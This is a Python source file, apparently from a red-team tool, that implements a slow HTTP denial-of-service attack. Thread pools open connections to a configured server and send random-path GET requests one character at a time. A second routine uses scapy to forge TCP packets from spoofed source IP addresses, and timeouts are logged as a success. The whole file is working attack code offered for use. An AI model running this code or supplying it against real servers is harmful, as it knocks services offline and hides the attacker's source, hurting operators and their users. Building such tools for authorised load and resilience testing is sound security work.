import random
import socket
import string
import threading
import time
from multiprocessing.pool import ThreadPool

from loguru import logger
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr1

from red.config import config
from red.utils import spoof_ip


def generate_random_string(length):
    return "".join(random.choices(possible_string_values, k=length))


possible_string_values = str(string.ascii_letters + string.digits + string.punctuation)
connection_time = 0.5
random_size = 900
payload_length = len(f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n".encode())
pps = payload_length / connection_time
bps = (20 + 20 + 1) * 8 * pps

stop = threading.Event()


def connection(_: None):
    while not stop.is_set():
        try:
            sock = socket.socket()
            sock.connect((config.server_host, config.server_port))
            payload = f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n"
            for char in payload:
                sock.send(char.encode())
                time.sleep(connection_time / len(payload))
            sock.close()
        except TimeoutError:
            logger.info("Got a timeout :tada:!")


def connection2(_: None):
    while not stop.is_set():
        try:
            ip = spoof_ip()
            syn = IP(dst=config.server_host, src=ip) / TCP(dport=80, flags='S')
            syn_ack = sr1(syn, verbose=False)
            payload = f"GET {generate_random_string(random_size)} HTTP/1.1\r\n\r\n"
            latest = syn_ack
            for char in payload:
                req = (
                        IP(dst=config.server_host, src=ip)
                        / TCP(dport=80, sport=latest[TCP].dport,
                              seq=latest[TCP].ack, ack=latest[TCP].seq + 1, flags='A')
                        / char.encode()
                )
                latest = sr1(req, verbose=False)
                time.sleep(connection_time / len(payload))
        except TimeoutError:
            logger.info("Got a timeout :tada:!")


def run():
    threads = int(config.attack.cli.pps)
    logger.info(f"Starting with: "
                f"{possible_string_values} "
                f"{connection_time} "
                f"{payload_length} "
                f"{pps} "
                f"{bps} "
                f"{threads} ")

    with ThreadPool(threads) as pool:
        pool.map(connection, [None] * threads)
    while True:
        try:
            time.sleep(1)
        except KeyboardInterrupt:
            stop.set()
